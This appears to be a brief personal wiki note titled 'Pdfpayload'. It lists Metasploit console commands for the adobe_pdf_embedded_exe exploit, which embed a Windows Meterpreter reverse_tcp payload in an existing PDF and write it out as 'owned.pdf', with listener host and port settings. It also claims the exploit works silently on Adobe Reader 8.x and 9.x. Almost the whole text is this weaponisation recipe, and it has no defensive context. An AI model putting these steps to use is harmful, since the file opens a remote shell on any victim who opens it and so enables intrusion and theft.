<!-- TITLE: Pdfpayload -->
<!-- SUBTITLE: A quick summary of Pdfpayload -->

use exploit/windows/fileformat/adobe_pdf_embedded_exe
set FILENAME owned.pdf
set INFILENAME /path/original.pdf
set OUTPUTPATH /path/
set id 0 (sets Target)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 9999

Demonstration video shows it working on Adobe 8.x and 9.x for windows with no prompt.
(link to video would be good, but I didn't save it)
